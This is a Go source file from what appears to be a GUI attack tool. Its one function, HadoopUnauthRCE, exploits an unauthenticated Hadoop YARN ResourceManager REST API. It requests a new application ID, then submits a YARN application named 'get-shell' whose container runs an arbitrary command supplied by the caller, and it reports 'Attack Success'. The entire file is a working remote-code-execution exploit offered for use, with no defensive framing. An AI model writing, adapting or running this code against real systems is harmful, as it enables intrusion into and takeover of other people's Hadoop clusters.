package vulattack

import (
	"encoding/json"
	"net/http"
	"slack/common/proxy"
	"strings"

	"fyne.io/fyne/v2/widget"
)

func HadoopUnauthRCE(target string, cmd string, result *widget.Entry) {
	target = strings.TrimSuffix(target, "/")
	url := target + "/ws/v1/cluster/apps/new-application"
	netClient := proxy.DefaultClient()
	resp, err := netClient.Post(url, "application/json", nil)
	if err != nil {
		result.SetText("Failed to send request\n")
		return
	}
	var respData map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&respData)
	_ = resp.Body.Close()
	appID, ok := respData["application-id"].(string)
	if !ok {
		result.SetText("Attack Failed\n")
		return
	}
	url = target + "/ws/v1/cluster/apps"
	amContainerSpec := map[string]interface{}{
		"commands": map[string]interface{}{
			"command": cmd,
		},
	}
	data := map[string]interface{}{
		"application-id":    appID,
		"application-name":  "get-shell",
		"am-container-spec": amContainerSpec,
		"application-type":  "YARN",
	}
	payload, _ := json.Marshal(data)
	req, _ := http.NewRequest("POST", url, strings.NewReader(string(payload)))
	req.Header.Set("Content-Type", "application/json")
	_, err = netClient.Do(req)
	if err != nil {
		result.SetText("Failed to send request")
		return
	}
	result.SetText("Attack Success")
}
